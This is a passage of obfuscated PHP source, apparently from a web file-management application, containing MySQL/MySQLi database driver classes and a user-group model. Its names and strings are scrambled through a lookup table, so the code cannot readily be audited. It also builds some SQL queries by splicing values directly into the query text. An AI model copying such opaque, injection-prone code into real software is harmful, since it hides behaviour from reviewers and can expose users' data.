$ÈÑ·óµœ[907]; } else { $´µä‰ß = $ÈÑ·óµœ[908]; } $ à‘¿øÓ = $this->query($´µä‰ß); $İ†ÃúãÙ = array(); foreach ($ à‘¿øÓ as $ÈÈÃ¢Á¢ => $œãğÃ) { $İ†ÃúãÙ[$ÈÈÃ¢Á¢] = current($œãğÃ); } return $İ†ÃúãÙ; } public function replace($ËÛöœ, $¹·‡”¤„ = array()) { $º”¶ÛË° =& $_SERVER[óó‹¸‚å]; foreach ($ËÛöœ as $„ı¹¯ƒ => $õ¤î†ÈÅ) { $Î´«øğ = $this->parseValue($õ¤î†ÈÅ); if (is_scalar($Î´«øğ)) { $í…ùĞ²[] = $Î´«øğ; $°Äûóó[] = $this->parseKey($„ı¹¯ƒ); } } $»ÑÚşÊÒ = $º”¶ÛË°[909] . $this->parseTable($¹·‡”¤„[$º”¶ÛË°[279]]) . $º”¶ÛË°[910] . implode($º”¶ÛË°[50], $°Äûóó) . $º”¶ÛË°[911] . implode($º”¶ÛË°[50], $í…ùĞ²) . $º”¶ÛË°[912]; return $this->execute($»ÑÚşÊÒ); } public function insertAll($º¿úùÇ¸, $ÀİÀòº· = array(), $¥áó§Œ‡ = false) { $˜Ç½“ =& $_SERVER[óó‹¸‚å]; if (!is_array($º¿úùÇ¸[0])) { return !1; } $ƒµÜå³Ü = array_keys($º¿úùÇ¸[0]); $¥•ÂŞæâ = array(); foreach ($º¿úùÇ¸ as $êí¶øÒ) { $„Œ¡ÍÁÆ = array(); foreach ($êí¶øÒ as $˜ÍûŠõ => $‰Ÿ·ö¤ã) { $‰Ÿ·ö¤ã = $this->parseValue($‰Ÿ·ö¤ã); if (is_scalar($‰Ÿ·ö¤ã)) { $„Œ¡ÍÁÆ[] = $‰Ÿ·ö¤ã; } } $¥•ÂŞæâ[] = $˜Ç½“[260] . implode($˜Ç½“[50], $„Œ¡ÍÁÆ) . $˜Ç½“[912]; } array_walk($ƒµÜå³Ü, array($this, $˜Ç½“[913])); $ÛÁşø¨“ = ($¥áó§Œ‡ ? $˜Ç½“[914] : $˜Ç½“[915]) . $˜Ç½“[916] . $this->parseTable($ÀİÀòº·[$˜Ç½“[279]]) . $˜Ç½“[910] . implode($˜Ç½“[50], $ƒµÜå³Ü) . $˜Ç½“[917] . implode($˜Ç½“[50], $¥•ÂŞæâ); return $this->execute($ÛÁşø¨“); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ºŒùÎµ =& $_SERVER[óó‹¸‚å]; $this->error = mysql_errno() . $ºŒùÎµ[4] . mysql_error($this->_linkID); if ($ºŒùÎµ[12] != $this->queryStr) { $this->error .= LNG($ºŒùÎµ[48]) . $this->queryStr; } think_trace($this->error, $ºŒùÎµ[12], $ºŒùÎµ[49]); return $this->error; } public function escapeString($¬“¤”ß³) { if ($this->_linkID) { return mysql_real_escape_string($¬“¤”ß³, $this->_linkID); } else { return mysql_escape_string($¬“¤”ß³); } } public function parseKey(&$ÒŸêÃè», $ıÑÑ†Äš = true) { $ßÊŠÕ­ =& $_SERVER[óó‹¸‚å]; if ($ıÑÑ†Äš) { $ÒŸêÃè» = $this->parseKeyCheck($ÒŸêÃè»); } if ($ÒŸêÃè» != $ßÊŠÕ­[188] && !preg_match($ßÊŠÕ­[918], $ÒŸêÃè»)) { $ÒŸêÃè» = $ßÊŠÕ­[385] . trim($ÒŸêÃè», $ßÊŠÕ­[385]) . $ßÊŠÕ­[385]; } return $ÒŸêÃè»; } } class DbMysqli extends Db { public function __construct($Ù£¸”¨¥ = '') { $áƒÍÛß¨ =& $_SERVER[óó‹¸‚å]; if (!extension_loaded($áƒÍÛß¨[919])) { think_exception(think_lang($áƒÍÛß¨[14]) . $áƒÍÛß¨[920]); } if (!empty($Ù£¸”¨¥)) { $this->config = $Ù£¸”¨¥; if (empty($this->config[$áƒÍÛß¨[17]])) { $this->config[$áƒÍÛß¨[17]] = $áƒÍÛß¨[12]; } } } public function connect($™÷²òõä = '', $ãøıá–¼ = 0) { $å§¾æÔà =& $_SERVER[óó‹¸‚å]; if (!isset($this->linkID[$ãøıá–¼])) { if (empty($™÷²òõä)) { $™÷²òõä = $this->config; } $this->linkID[$ãøıá–¼] = new mysqli($™÷²òõä[$å§¾æÔà[893]], $™÷²òõä[$å§¾æÔà[895]], $™÷²òõä[$å§¾æÔà[896]], $™÷²òõä[$å§¾æÔà[21]], $™÷²òõä[$å§¾æÔà[894]] ? intval($™÷²òõä[$å§¾æÔà[894]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ü¸¦¹™£ = $this->linkID[$ãøıá–¼]->server_version; $this->linkID[$ãøıá–¼]->query($å§¾æÔà[897] . think_config($å§¾æÔà[898]) . $å§¾æÔà[58]); if ($ü¸¦¹™£ > $å§¾æÔà[899]) { $this->linkID[$ãøıá–¼]->query($å§¾æÔà[900]); } $this->connected = !0; if (1 != think_config($å§¾æÔà[22])) { unset($this->config); } } return $this->linkID[$ãøıá–¼]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ø¹Ş§ó’) { $æ¨·Á”® =& $_SERVER[óó‹¸‚å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ø¹Ş§ó’; if ($this->queryID) { $this->free(); } think_action_status($æ¨·Á”®[23], 1); think_status($æ¨·Á”®[24]); $this->queryID = $this->_linkID->query($ø¹Ş§ó’); if ($this->_linkID->more_results()) { while (($™·Ñà§œ = $this->_linkID->next_result()) != NULL) { $™·Ñà§œ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($‚àîôƒÂ) { $ô±´„ =& $_SERVER[óó‹¸‚å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‚àîôƒÂ; if ($this->queryID) { $this->free(); } think_action_status($ô±´„[25], 1); think_status($ô±´„[24]); $¸›Ğœú™ = $this->_linkID->query($‚àîôƒÂ); $this->debug(); if (!1 === $¸›Ğœú™) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Àæ±ı§ğ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Àæ±ı§ğ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $İòŠÏÒ„ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$İòŠÏÒ„) { $this->error(); return !1; } } return !0; } private function getAll() { $Ø•Ìõ´ì = array(); if ($this->numRows > 0) { for ($½öó» = 0; $½öó» < $this->numRows; $½öó»++) { $Ø•Ìõ´ì[$½öó»] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Ø•Ìõ´ì; } public function getFields($ä¥ÛÂ§½) { $ÍÃü¢Ì› =& $_SERVER[óó‹¸‚å]; $Ñ¹¡Å½½ = $this->query($ÍÃü¢Ì›[904] . $this->parseKey($ä¥ÛÂ§½)); $›í³€£‚ = array(); if ($Ñ¹¡Å½½) { foreach ($Ñ¹¡Å½½ as $˜´Ï¡ÅÈ => $â’¦óÆ­) { $›í³€£‚[$â’¦óÆ­[$ÍÃü¢Ì›[31]]] = array($ÍÃü¢Ì›[32] => $â’¦óÆ­[$ÍÃü¢Ì›[31]], $ÍÃü¢Ì›[33] => $â’¦óÆ­[$ÍÃü¢Ì›[34]], $ÍÃü¢Ì›[35] => (bool) ($â’¦óÆ­[$ÍÃü¢Ì›[36]] === $ÍÃü¢Ì›[12]), $ÍÃü¢Ì›[37] => $â’¦óÆ­[$ÍÃü¢Ì›[38]], $ÍÃü¢Ì›[39] => strtolower($â’¦óÆ­[$ÍÃü¢Ì›[40]]) == $ÍÃü¢Ì›[41], $ÍÃü¢Ì›[42] => strtolower($â’¦óÆ­[$ÍÃü¢Ì›[43]]) == $ÍÃü¢Ì›[44]); } } return $›í³€£‚; } public function getTables($ÎåØâŞ© = '') { $¥÷‘ı”• =& $_SERVER[óó‹¸‚å]; $ã™çÅøñ = !empty($ÎåØâŞ©) ? $¥÷‘ı”•[906] . $ÎåØâŞ© . $¥÷‘ı”•[907] : $¥÷‘ı”•[908]; $×Âèğôî = $this->query($ã™çÅøñ); $“òĞæ§Ë = array(); if ($×Âèğôî) { foreach ($×Âèğôî as $´¯ò¶åš => $ÚÀñÒÑş) { $“òĞæ§Ë[$´¯ò¶åš] = current($ÚÀñÒÑş); } } return $“òĞæ§Ë; } public function replace($Ûş¡ÈÎ®, $©îÆ­“û = array()) { $È¬èñ‰® =& $_SERVER[óó‹¸‚å]; foreach ($Ûş¡ÈÎ® as $ÄÏ’¾éë => $˜¶ò£ó¶) { $åçÉğ˜ = $this->parseValue($˜¶ò£ó¶); if (is_scalar($åçÉğ˜)) { $©‘Ø²åØ[] = $åçÉğ˜; $í–ÉÂÇ[] = $this->parseKey($ÄÏ’¾éë); } } $¹³—Ëë = $È¬èñ‰®[909] . $this->parseTable($©îÆ­“û[$È¬èñ‰®[279]]) . $È¬èñ‰®[910] . implode($È¬èñ‰®[50], $í–ÉÂÇ) . $È¬èñ‰®[911] . implode($È¬èñ‰®[50], $©‘Ø²åØ) . $È¬èñ‰®[912]; return $this->execute($¹³—Ëë); } public function insertAll($¥…„¹ò¾, $ÏÓÁåø = array(), $ç‹óıìË = false) { $ÉÚËœ×° =& $_SERVER[óó‹¸‚å]; if (!is_array($¥…„¹ò¾[0])) { return !1; } $±Ïüóğ­ = array_keys($¥…„¹ò¾[0]); $íñíÉ  = array(); foreach ($¥…„¹ò¾ as $–ş­§ı®) { $ğÖ´á† = array(); foreach ($–ş­§ı® as $ê÷ÜœÜ => $Óâğã¥) { $Óâğã¥ = $this->parseValue($Óâğã¥); if (is_scalar($Óâğã¥)) { $ğÖ´á†[] = $Óâğã¥; } } $íñíÉ [] = $ÉÚËœ×°[260] . implode($ÉÚËœ×°[50], $ğÖ´á†) . $ÉÚËœ×°[912]; } array_walk($±Ïüóğ­, array($this, $ÉÚËœ×°[913])); $İÖÔ„¤ = $ç‹óıìË ? $ÉÚËœ×°[914] : $ÉÚËœ×°[915]; $Ë×ñÓé« = $İÖÔ„¤ . $ÉÚËœ×°[916] . $this->parseTable($ÏÓÁåø[$ÉÚËœ×°[279]]) . $ÉÚËœ×°[910] . implode($ÉÚËœ×°[50], $±Ïüóğ­) . $ÉÚËœ×°[917] . implode($ÉÚËœ×°[50], $íñíÉ ); return $this->execute($Ë×ñÓé«); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $‡óÔ ß =& $_SERVER[óó‹¸‚å]; $this->error = $this->_linkID->errno . $‡óÔ ß[4] . $this->_linkID->error; if ($‡óÔ ß[12] != $this->queryStr) { $this->error .= LNG($‡óÔ ß[48]) . $this->queryStr; } think_trace($this->error, $‡óÔ ß[12], $‡óÔ ß[49]); return $this->error; } public function escapeString($…–§òä) { if ($this->_linkID) { return $this->_linkID->real_escape_string($…–§òä); } else { return addslashes($…–§òä); } } public function parseKey(&$Øİ¹¡Ç¾, $Îñ‡Õ¥Õ = true) { $ªÇíÖ²Õ =& $_SERVER[óó‹¸‚å]; if ($Îñ‡Õ¥Õ) { $Øİ¹¡Ç¾ = $this->parseKeyCheck($Øİ¹¡Ç¾); } if ($Øİ¹¡Ç¾ != $ªÇíÖ²Õ[188] && !preg_match($ªÇíÖ²Õ[918], $Øİ¹¡Ç¾)) { $Øİ¹¡Ç¾ = $ªÇíÖ²Õ[385] . trim($Øİ¹¡Ç¾, $ªÇíÖ²Õ[385]) . $ªÇíÖ²Õ[385]; } return $Øİ¹¡Ç¾; } } goto cË”óµÓÚ; bôÈš­Ñ³: class GroupModel extends ModelBase { protected $tableName = "\147\162\157\165\x70"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\x61\x6d\x65" => "\x67\162\157\x75\160\x5f\155\x65\164\141", "\155\x65\164\x61\x46\151\x65\x6c\x64" => "\x67\x72\157\x75\x70\x49\x44"); protected function cacheFunctionAlias($…©ñ³Ğ¸) { $ˆ¾ÒÀ¡ş =& $_SERVER[óó‹¸‚å]; return array($ˆ¾ÒÀ¡ş[1941] => array($…©ñ³Ğ¸[0], $ˆ¾ÒÀ¡ş[1942]), $ˆ¾ÒÀ¡ş[1943] => array($…©ñ³Ğ¸[0], $ˆ¾ÒÀ¡ş[1944])); } protected function getInfo($åÒ£¬Å, $•²Äç÷ = false) { $îÎ½Çùœ = $this->getInfoSimple($åÒ£¬Å); if (!$îÎ½Çùœ) { return !1; } if ($•²Äç÷) { return $this->_listDataApplyItem($îÎ½Çùœ); } return $this->cacheFunctionGet($_SERVER[óó‹¸‚å][1945], $åÒ£¬Å); } protected function getInfoSimple($ÊÛÊœï¦, $Û¤ÌñÚ = false) { $†ğë‘Êã =& $_SERVER[óó‹¸‚å]; if ($Û¤ÌñÚ) { $¼°¼•Í = array($†ğë‘Êã[1863] => intval($ÊÛÊœï¦)); $Ğ²ùÁÔ = $this->where($¼°¼•Í)->find(); return is_array($Ğ²ùÁÔ) ? $Ğ²ùÁÔ : array(); } return $this->cacheFunctionGet($†ğë‘Êã[1946], $ÊÛÊœï¦); } protected function groupAdd($¸à‚½Üö) { $¥†ñ€íõ =& $_SERVER[óó‹¸‚å]; if (!$¸à‚½Üö[$¥†ñ€íõ[432]] && isset($¸à‚½Üö[$¥†ñ€íõ[1863]]) && $¸à‚½Üö[$¥†ñ€íõ[1863]] == 1) { if ($¶¾İß™³ = $this->getInfoSimple($¸à‚½Üö[$¥†ñ€íõ[1863]], !0)) { return $¸à‚½Üö[$¥†ñ€íõ[1863]]; } } else { $¶¾İß™³ = $this->getInfoSimple($¸à‚½Üö[$¥†ñ€íõ[432]]); if (!$¶¾İß™³) { return !1; } } $à·º¿©Ñ = $¥†ñ€íõ[531]; if ($¶¾İß™³[$¥†ñ€íõ[521]]) { $à·º¿©Ñ = $¶¾İß™³[$¥†ñ€íõ[521]] . $¶¾İß™³[$¥†ñ€íõ[1863]] . $¥†ñ€íõ[50]; } $©×Š¡ˆ = array($¥†ñ€íõ[420] => $this->groupNameAuto($¸à‚½Üö[$¥†ñ€íõ[432]], $¸à‚½Üö[$¥†ñ€íõ[32]]), $¥†ñ€íõ[401] => $¸à‚½Üö[$¥†ñ€íõ[432]], $¥†ñ€íõ[590] => $à·º¿©Ñ, $¥†ñ€íõ[1947] => $¸à‚½Üö[$¥†ñ€íõ[1850]], $¥†ñ€íõ[1948] => 0, $¥†ñ€íõ[1867] => 0); if (isset($¸à‚½Üö[$¥†ñ€íõ[1887]])) { $©×Š¡ˆ[$¥†ñ€íõ[1887]] = $¸à‚½Üö[$¥†ñ€íõ[1887]]; } else { $§ïÂ™œó = $this->max($¥†ñ€íõ[1887]); if (!$§ïÂ™œó) { $§ïÂ™œó = 0; } $©×Š¡ˆ[$¥†ñ€íõ[1887]] = $§ïÂ™œó + 1; } if (!empty($¸à‚½Üö[$¥†ñ€íõ[1863]])) { $©×Š¡ˆ[$¥†ñ€íõ[1863]] = $¸à‚½Üö[$¥†ñ€íõ[1863]]; } $Á´ª›İ¶ = $this->add($©×Š¡ˆ); $this->setNamePinyin($Á´ª›İ¶, $©×Š¡ˆ[$¥†ñ€íõ[32]]); if (isset($¸à‚½Üö[$¥†ñ€íõ[1949]])) { $this->metaSet($Á´ª›İ¶, array($¥†ñ€íõ[1949] => $¸à‚½Üö[$¥†ñ€íõ[1949]], $¥†ñ€íõ[1950] => $¸à‚½Üö[$¥†ñ€íõ[1950]])); unset($¸à‚½Üö[$¥†ñ€íõ[1949]]); unset($¸à‚½Üö[$¥†ñ€íõ[1950]]); } Model($¥†ñ€íõ[1343])->groupRootAdd($Á´ª›İ¶); return $Á´ª›İ¶; } protected function groupEdit($´ûØò×ô, $İÓ²Éü±) { $¤Îä…²Ñ =& $_SERVER[óó‹¸‚å]; $Ó·»ÏãŞ = $this->getInfoSimple($´ûØò×ô); if (!$Ó·»ÏãŞ) { return !1; } if (!empty($İÓ²Éü±[$¤Îä…²Ñ[432]])) { $÷‚ßŸ“¤ = $this->getInfoSimple($İÓ²Éü±[$¤Îä…²Ñ[432]]); if (!$÷‚ßŸ“¤) { return !1; } if ($Ó·»ÏãŞ[$¤Îä…²Ñ[1863]] == $÷‚ßŸ“¤[$¤Îä…²Ñ[1863]]) { return !1; } if ($İÓ²Éü±[$¤Îä…²Ñ[432]] != $Ó·»ÏãŞ[$¤Îä…²Ñ[432]]) { if ($÷‚ßŸ“¤[$¤Îä…²Ñ[521]] !== $Ó·»ÏãŞ[$¤Îä…²Ñ[521]] && strpos($÷‚ßŸ“¤[$¤Îä…²Ñ[521]], $Ó·»ÏãŞ[$¤Îä…²Ñ[521]] . $Ó·»ÏãŞ[$¤Îä…²Ñ[1863]] . $¤Îä…²Ñ[50]) === 0) { return !1; } $İÓ²Éü±[$¤Îä…²Ñ[590]] = $÷‚ßŸ“¤[$¤Îä…²Ñ[521]] . $İÓ²Éü±[$¤Îä…²Ñ[432]] . $¤Îä…²Ñ[50]; $this->_changeChildLevel($Ó·»ÏãŞ, $÷‚ßŸ“¤); } } if (isset($İÓ²Éü±[$¤Îä…²Ñ[32]])) { $this->setNamePinyin($´ûØò×ô, $İÓ²Éü±[$¤Îä…²Ñ[32]]); } if (isset($İÓ²Éü±[$¤Îä…²Ñ[1949]])) { $this->metaSet($´ûØò×ô, array($¤Îä…²Ñ[1949] => $İÓ²Éü±[$¤Îä…²Ñ[1949]], $¤Îä…²Ñ[1950] => $İÓ²Éü±[$¤Îä…²Ñ[1950]])); unset($İÓ²Éü±[$¤Îä…²Ñ[1949]]); unset($İÓ²Éü±[$¤Îä…²Ñ[1950]]); } $this->_clearChildrenCache($Ó·»ÏãŞ); return $this->where(array($¤Îä…²Ñ[1951] => $´ûØò×ô))->save($İÓ²Éü±); } private function _clearChildrenCache($ö½Øâúç) { $ĞŒğü­à =& $_SERVER[óó‹¸‚å]; $úÈãÓ“ = array($ĞŒğü­à[590] => array($ĞŒğü­à[550], $ö½Øâúç[$ĞŒğü­à[521]] . $ö½Øâúç[$ĞŒğü­à[1863]] . $ĞŒğü­à[551])); $Ş¹º¡áì = $this->field($ĞŒğü­à[1863])->where($úÈãÓ“)->select(); foreach ($Ş¹º¡áì as $Êø¤Üä¬) { $this->_clearCache($Êø¤Üä¬[$ĞŒğü­à[1863]]); } } private function _clearCache($åø‘¼â) { $Ï£÷“é¢ =& $_SERVER[óó‹¸‚å]; $this->cacheFunctionClear($Ï£÷“é¢[1945], $åø‘¼â); $this->cacheFunctionClear($Ï£÷“é¢[1946], $åø‘¼â); } private function _changeChildLevel($æ¡ää¥Œ, $–î”§ğ«, $öø¬‘Ë = false) { $ç±“©„‚ =& $_SERVER[óó‹¸‚å]; $‘·©ûÁ± = $æ¡ää¥Œ[$ç±“©„‚[521]] . $æ¡ää¥Œ[$ç±“©„‚[1863]] . $ç±“©„‚[50]; $Ñ¨‰“Ú° = $–î”§ğ«[$ç±“©„‚[521]] . $–î”§ğ«[$ç±“©„‚[1863]] . $ç±“©„‚[50] . $æ¡ää¥Œ[$ç±“©„‚[1863]] . $ç±“©„‚[50]; if ($öø¬‘Ë) { $Ñ¨‰“Ú° = $–î”§ğ«[$ç±“©„‚[521]] . $–î”§ğ«[$ç±“©„‚[1863]] . $ç±“©„‚[50]; } $š‹ÜŠïÅ = array($ç±“©„‚[590] => array($ç±“©„‚[550], $æ¡ää¥Œ[$ç±“©„‚[521]] . $æ¡ää¥Œ[$ç±“©„‚[1863]] . $ç±“©„‚[551])); $÷¾ ¹ïÏ = array($ç±“©„‚[590] => array($ç±“©„‚[599], "\162\145\x70\154\141\143\x65\x28\x70\x61\162\145\x6e\x74\114\x65\166\145\154\x2c\47{$‘·©ûÁ±}\47\x2c\47{$Ñ¨‰“Ú°}\x27\51")); $this->_clearChildrenCache($æ¡ää¥Œ); $this->where($š‹ÜŠïÅ)->data($÷¾ ¹ïÏ)->save(); } public function setNamePinyin($¡Ææ‚ñ, $¬ÏûÕ¸‡ = false) { $¾âÌé¦Ê =& $_SERVER[óó‹¸‚å]; if (!$¬ÏûÕ¸‡) { $¦½¨¿É“ = $this->getInfoSimple($¡Ææ‚ñ); $¬ÏûÕ¸‡ = $¦½¨¿É“[$¾âÌé¦Ê[32]]; } if (!Input::check($¬ÏûÕ¸‡, $¾âÌé¦Ê[593])) { $this->metaSet($¡Ææ‚ñ, $¾âÌé¦Ê[465], null); $this->metaSet($¡Ææ‚ñ, $¾âÌé¦Ê[464], null); return; } $ÇÔÚÄñ = array($¾âÌé¦Ê[465] => str_replace($¾âÌé¦Ê[53], $¾âÌé¦Ê[12], Pinyin::get($¬ÏûÕ¸‡)), $¾âÌé¦Ê[464] => Pinyin::get($¬ÏûÕ¸‡, $¾âÌé¦Ê[594])); $this->metaSet($¡Ææ‚ñ, $ÇÔÚÄñ); } protected function groupStatus($¶¯¥ÂûË, $ƒë«„ò) { $º±Ëßƒñ =& $_SERVER[óó‹¸‚å]; $‡ïŞßÅé = $this->getInfoSimple($¶¯¥ÂûË); if (!$‡ïŞßÅé) { return !1; } if ($ƒë«„ò == $º±Ëßƒñ[88]) { $÷¸º´·¨ = $this->parentLevelArray($‡ïŞßÅé[$º±Ëßƒñ[521]]); } else { $™Ò­„­£ = array($º±Ëßƒñ[590] => array($º±Ëßƒñ[550], $‡ïŞßÅé[$º±Ëßƒñ[521]] . $‡ïŞßÅé[$º±Ëßƒñ[1863]] . $º±Ëßƒñ[551])); $÷¸º´·¨ = $this->where($™Ò­„­£)->field($º±Ëßƒñ[1863])->select(); $÷¸º´·¨ = array_to_keyvalue($÷¸º´·¨, $º±Ëßƒñ[12], $º±Ëßƒñ[1863]); } $÷¸º´·¨[] = $‡ïŞßÅé[$º±Ëßƒñ[1863]]; $å¡®Ÿ½Ü = array(); foreach ($÷¸º´·¨ as $¶¯¥ÂûË) { $å¡®Ÿ½Ü[] = array($º±Ëßƒñ[1863] => $¶¯¥ÂûË, $º±Ëßƒñ[94] => $º±Ëßƒñ[754], $º±Ëßƒñ[374] => $ƒë«„ò); $this->_clearCache($¶¯¥ÂûË); } return Model($º±Ëßƒñ[1952])->addAll($å¡®Ÿ½Ü, array(), !0); } protected function groupRemove($ˆá§‘·‹, $É§û…ô« = false) { $”í¼¦÷• =& $_SERVER[óó‹¸‚å]; $¼€’şÏ» = array($”í¼¦÷•[1863] => $ˆá§‘·‹); $·°Á¦˜ = $this->where($¼€’şÏ»)->find(); if (!$·°Á¦˜ || $·°Á¦˜[$”í¼¦÷•[432]] == 0) { return !1; } if (!$É§û…ô«) { $øÕÆ‘¹Â = $this->getInfoSimple($·°Á¦˜[$”í¼¦÷•[432]]); $this->_changeChildLevel($·°Á¦˜, $øÕÆ‘¹Â, !0); $this->where(array($”í¼¦÷•[432] => $ˆá§‘·‹))->save(array($”í¼¦÷•[432] => $·°Á¦˜[$”í¼¦÷•[432]])); } Model($”í¼¦÷•[1952])->where($¼€’şÏ»)->delete(); Model($”í¼¦÷•[1953])->where($¼€’şÏ»)->delete(); Model($”í¼¦÷•[829])->groupRootRemove($ˆá§‘·‹); return $this->where($¼€’şÏ»)->delete(); } protected function groupSort($½×²È÷ë) { $ˆÏÀ¼µ’ =& $_SERVER[óó‹¸‚å]; $ßæÕ›ü = array(); foreach ($½×²È÷ë as $ò÷’ı¹½ => $¦—î¡¤) { $ßæÕ›ü[] = array($ˆÏÀ¼µ’[1863], $¦—î¡¤, $ˆÏÀ¼µ’[1887], $ò÷’ı¹½ + 1); } $this->saveAll($ßæÕ›ü); } public function listData() { $Ãİ­ñùó = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ãİ­ñùó[$_SERVER[óó‹¸‚å][369]]); return $Ãİ­ñùó; } private function _makeOrder($ôõæ´¦– = '') { $«ƒ‰›ï =& $_SERVER[óó‹¸‚å]; $ÅµÁúå = array($«ƒ‰›ï[1863], $«ƒ‰›ï[32], $«ƒ‰›ï[1852], $«ƒ‰›ï[200]); $Ã×Ò¿¹ê = array($«ƒ‰›ï[450] => $«ƒ‰›ï[451], $«ƒ‰›ï[452] => $«ƒ‰›ï[453]); $½ú¯ô¸Ñ = Input::get($«ƒ‰›ï[457], $«ƒ‰›ï[7], $«ƒ‰›ï[1867], $ÅµÁúå); $æÚÊÔÉ» = Input::get($«ƒ‰›ï[458], $«ƒ‰›ï[7], $«ƒ‰›ï[1954], array($«ƒ‰›ï[1954], $«ƒ‰›ï[452])); $æÚÊÔÉ» = $Ã×Ò¿¹ê[$æÚÊÔÉ»]; $ôõæ´¦– = $ôõæ´¦– . "{$½ú¯ô¸Ñ}\x20{$æÚÊÔÉ»}\54\x20\x67\162\x6f\165\160\x49\104\x20\141\163\143"; return $this->order($ôõæ´¦–); } public function listChild($Ãñ«Å“Ô) { $åÒÊşÚÆ =& $_SERVER[óó‹¸‚å]; $äˆÕıŞ¸ = $this->where(array($åÒÊşÚÆ[432] => $Ãñ«Å“Ô))->_makeOrder()->selectPage(200); $this->_listDataApply($äˆÕıŞ¸[$åÒÊşÚÆ[369]]); return $äˆÕıŞ¸; } public function listChildIds($ÚÂíŸ³¾) { $Ô«Ø…¥ =& $_SERVER[óó‹¸‚å]; if (is_string($İç—¹)) { $ÚÂíŸ³¾ = explode($Ô«Ø…¥[50], $ÚÂíŸ³¾); } $÷ÀÍÇ± = $this->where(array($Ô«Ø…¥[1863] => array($Ô«Ø…¥[7], $ÚÂíŸ³¾)))->field($Ô«Ø…¥[1955])->select(); if (!$÷ÀÍÇ±) { return !1; } $ıÉ‘Ë† = array(); foreach ($÷ÀÍÇ± as $¾á³ƒ) { $ıÉ‘Ë†[] = "\163\x65\154\145\x63\x74\x20\x67\162\157\165\160\x49\104\x20\x66\x72\157\155\40\140\147\162\157\165\x70\x60\40\167\x68\x65\x72\x65\40\x70\141\x72\x65\156\164\114\145\166\145\x6c\40\154\x69\153\x65\40\x27{$¾á³ƒ[$Ô«Ø…¥[521]]}{$¾á³ƒ[$Ô«Ø…¥[1863]]}\x2c\45\47"; } $ıÉ‘Ë† = implode($Ô«Ø…¥[1956], $ıÉ‘Ë†); $÷ÀÍÇ± = $this->query($ıÉ‘Ë†); if (!$÷ÀÍÇ±) { return array(); } $ÚÂíŸ³¾ = array_to_keyvalue($÷ÀÍÇ±, $Ô«Ø…¥[12], $Ô«Ø…¥[1863]); return array_unique($ÚÂíŸ³¾); } public function listByID($¿¥Æˆíß) { $Å”Óé‚¼ =& $_SERVER[óó‹¸‚å]; if (!$¿¥Æˆíß) { return array(); } $Ã¬Ñº±ƒ = array($Å”Óé‚¼[1863] => array($Å”Óé‚¼[7], $¿¥Æˆíß)); $èò Âö = $this->where($Ã¬Ñº±ƒ)->select(); $èò Âö = array_sort_keep($èò Âö, $Å”Óé‚¼[1863], $¿¥Æˆíß); $this->_listDataApply($èò Âö); return $èò Âö; } public function listSearch($´­¤Ñà˜) { $ññä˜ÙÈ =& $_SERVER[óó‹¸‚å]; $¢ ™Úªä = $´­¤Ñà˜[$ññä˜ÙÈ[1957]]; $ıÜ”Ë”“ = isset($´­¤Ñà˜[$ññä˜ÙÈ[1958]]) ? $´­¤Ñà˜[$ññä˜ÙÈ[1958]] : !1; if (!trim($¢ ™Úªä)) { return !1; } $¢ ™Úªä = str_replace($ññä˜ÙÈ[1959], $ññä˜ÙÈ[1960], $¢ ™Úªä); $õ¾äâÑ£ = array($ññä˜ÙÈ[1863] => array($ññä˜ÙÈ[383], "{$¢ ™Úªä}\45"), $ññä˜ÙÈ[32] => array($ññä˜ÙÈ[383], "\45{$¢ ™Úªä}\x25"), $ññä˜ÙÈ[1007] => $ññä˜ÙÈ[1961]); if ($ıÜ”Ë”“) { $åãóş‘ì = $this->getInfoSimple($ıÜ”Ë”“); $¥¡ò£µã = $åãóş‘ì[$ññä˜ÙÈ[521]] . $ıÜ”Ë”“ . $ññä˜ÙÈ[551]; $õ¾äâÑ£ = array($õ¾äâÑ£, array($ññä˜ÙÈ[521] => array($ññä˜ÙÈ[383], $¥¡ò£µã))); } $õ¾äâÑ£ = $this->parseWhereLike($õ¾äâÑ£); $¬•Ûµõ’ = $this->_makeOrder()->where($õ¾äâÑ£)->selectPage(20); $¬•Ûµõ’ = $¬•Ûµõ’ ? $¬•Ûµõ’ : array($ññä˜ÙÈ[369] => array(), $ññä˜ÙÈ[366] => array()); if (!$¬•Ûµõ’ || count($¬•Ûµõ’[$ññä˜ÙÈ[369]]) < 5 && Input::check($¢ ™Úªä, $ññä˜ÙÈ[318])) { $ŞŸæêÕ¨ = $this->groupChildrenAll($ıÜ”Ë”“); $„ÆÈæë¥ = $this->_searchFromMeta($ññä˜ÙÈ[464], $¢ ™Úªä, 10, $ŞŸæêÕ¨); $İ—Œ¶¹ = $this->_searchFromMeta($ññä˜ÙÈ[465], $¢ ™Úªä, 10, $ŞŸæêÕ¨); $…Ô‡º¬è = array_merge($„ÆÈæë¥, $İ—Œ¶¹, $¬•Ûµõ’[$ññä˜ÙÈ[369]]); $¬•Ûµõ’[$ññä˜ÙÈ[369]] = array_unique_by_key($…Ô‡º¬è, $ññä˜ÙÈ[1863]); $¬•Ûµõ’[$ññä˜ÙÈ[366]][$ññä˜ÙÈ[367]] = count($¬•Ûµõ’[$ññä˜ÙÈ[369]]); $¬•Ûµõ’[$ññä˜ÙÈ[366]][$ññä˜ÙÈ[368]] = 